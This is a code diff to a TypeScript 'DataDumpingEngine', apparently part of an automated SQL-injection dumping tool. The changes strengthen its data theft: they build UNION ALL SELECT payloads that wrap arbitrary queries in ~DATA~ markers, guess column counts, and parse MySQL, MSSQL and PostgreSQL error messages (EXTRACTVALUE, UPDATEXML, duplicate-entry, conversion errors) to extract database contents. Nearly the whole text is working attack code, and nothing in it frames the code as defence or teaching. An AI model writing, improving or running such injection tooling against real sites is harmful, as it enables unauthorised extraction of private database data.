@@ -335,11 +335,11 @@ export class DataDumpingEngine {
   }
 
   /**
-   * UNION-based extraction
+   * UNION-based extraction with strict Regex markers
    */
   private async extractValueUnion(query: string): Promise<string | null> {
     try {
-      // Build UNION payload
+      // Build UNION payload with custom markers
       const payload = this.buildUnionPayload(query);
       const url = this.injectPayload(payload);
       
@@ -350,19 +350,36 @@ export class DataDumpingEngine {
       
       if (result.error || result.status >= 400) return null;
       
-      // Extract value from response using markers
-      const match = result.body.match(/~~SQLIDUMPER~~(.+?)~~SQLIDUMPER~~/);
-      if (match) return match[1];
+      // Extract value using STRICT REGEX for ~DATA~ markers
+      const strictPatterns = [
+        /~DATA~(.+?)~DATA~/i,           // Custom marker: ~DATA~value~DATA~
+        /~~SQLIDUMPER~~(.+?)~~SQLIDUMPER~~/i,  // SQLIDUMPER marker
+        /\[\[(.+?)\]\]/,                // Double bracket: [[value]]
+        /\{\{(.+?)\}\}/,                // Double brace: {{value}}
+      ];
+      
+      for (const pattern of strictPatterns) {
+        const match = result.body.match(pattern);
+        if (match && match[1]) {
+          const extracted = match[1].trim();
+          // Validate extracted data (not HTML/script tags)
+          if (extracted && !extracted.match(/^<|>$|javascript:/i)) {
+            await this.log("debug", `[Union] Extracted: ${extracted.substring(0, 50)}`);
+            return extracted;
+          }
+        }
+      }
       
       // Fallback: look for visible output
       return this.extractFromHTML(result.body);
     } catch (error) {
+      await this.log("error", `[Union] Extraction error: ${error}`);
       return null;
     }
   }
 
   /**
-   * Error-based extraction
+   * Error-based extraction with enhanced Regex patterns
    */
   private async extractValueError(query: string): Promise<string | null> {
     try {
@@ -375,31 +392,55 @@ export class DataDumpingEngine {
         timeout: 10000,
       });
       
-      // Extract from error messages - MySQL EXTRACTVALUE returns data between markers
-      const patterns = [
-        /XPATH syntax error: '~(.+?)~'/i,  // EXTRACTVALUE marker
-        /Duplicate entry '(.+?)' for key/i,
-        /conversion failed when converting.*?'(.+?)'/i,
-        /"(.+?)".*?for key/i,
-        /Error: (.+?)<br/i,
-        /Warning: (.+?)<br/i,
-        /SQLSTATE\[.+?\]: (.+?)<br/i,
+      if (!result.body) return null;
+
+      // STRICT extraction patterns for ERROR-BASED SQLi
+      const errorPatterns = [
+        // MySQL EXTRACTVALUE: XPATH syntax error: '~value~'
+        { regex: /XPATH syntax error:\s*'~([^~]+)~'/i, name: "EXTRACTVALUE" },
+        { regex: /XPATH syntax error:\s*'~(.+?)~'/i, name: "EXTRACTVALUE_GREEDY" },
+        
+        // MySQL UPDATEXML: ~value~
+        { regex: /~([^~\s]+)~/i, name: "UPDATEXML" },
+        
+        // MySQL Generic: Duplicate entry
+        { regex: /Duplicate entry\s+'([^']+)'/i, name: "DUPLICATE" },
+        
+        // MSSQL: Conversion error
+        { regex: /conversion failed.*?'([^']+)'/i, name: "MSSQL_CONVERT" },
+        
+        // PostgreSQL: ERROR
+        { regex: /ERROR:\s+([^\n<]+)/i, name: "POSTGRESQL" },
+        
+        // Generic: Error message in HTML
+        { regex: /<(?:p|div|span|pre)[^>]*>([^<]+Error[^<]*)<\/(?:p|div|span|pre)>/i, name: "HTML_ERROR" },
+        
+        // Generic: Value between markers
+        { regex: /<(?:b|strong)>([^<]+)<\/(?:b|strong)>/i, name: "HTML_BOLD" },
       ];
       
-      for (const pattern of patterns) {
-        const match = result.body.match(pattern);
+      for (const { regex, name } of errorPatterns) {
+        const match = result.body.match(regex);
         if (match && match[1]) {
-          // Clean up the extracted value
           let value = match[1].trim();
-          // Remove any trailing error text
-          value = value.split(/\s+(in|at|on line)/i)[0];
-          return value;
+          
+          // Clean up extracted value
+          value = value.replace(/<[^>]+>/g, '');  // Remove HTML tags
+          value = value.split(/\s+(in|at|on line)/i)[0];  // Remove trailing error info
+          value = value.replace(/\0/g, '');  // Remove null bytes
+          
+          // Validate extraction
+          if (value && value.length > 0 && value.length < 1000) {
+            await this.log("debug", `[Error-${name}] Extracted: ${value.substring(0, 50)}`);
+            return value;
+          }
         }
       }
       
       // Fallback: Try to extract from HTML
       return this.extractFromHTML(result.body);
     } catch (error) {
+      await this.log("error", `[Error] Extraction error: ${error}`);
       return null;
     }
   }
@@ -514,18 +555,32 @@ export class DataDumpingEngine {
     // Use the original payload structure from vulnerability
     const basePayload = this.context.injectionPoint;
     
-    // If injection point has placeholder, replace it
+    // Detect column count (try common ones: 2-6)
+    const columnCount = this.detectColumnCount(basePayload) || 5;
+    const nulls = Array(columnCount - 1).fill("NULL").join(",");
+    
+    // Use ~DATA~ markers for strict extraction
+    const unionPayload = `' UNION ALL SELECT ${nulls},CONCAT('~DATA~',(${query}),'~DATA~')-- -`;
+    
     if (basePayload.includes("*INJECT*")) {
-      const columnCount = 5; // TODO: Auto-detect
-      const nulls = Array(columnCount - 1).fill("NULL").join(",");
-      const unionPayload = `' UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')-- -`;
       return basePayload.replace("*INJECT*", unionPayload);
     }
     
-    // Otherwise append to injection point
-    const columnCount = 5;
-    const nulls = Array(columnCount - 1).fill("NULL").join(",");
-    return `${basePayload}' UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')-- -`;
+    return `${basePayload}' UNION ALL SELECT ${nulls},CONCAT('~DATA~',(${query}),'~DATA~')-- -`;
+  }
+
+  /**
+   * Detect column count from injection point
+   */
+  private detectColumnCount(injectionPoint: string): number | null {
+    // Try to detect from existing ORDER BY or UNION payloads
+    const orderByMatch = injectionPoint.match(/ORDER\s+BY\s+(\d+)/i);
+    if (orderByMatch) {
+      return parseInt(orderByMatch[1]);
+    }
+    
+    // Default to 5 columns (most common)
+    return null;
   }
 
   private buildErrorPayload(query: string): string {
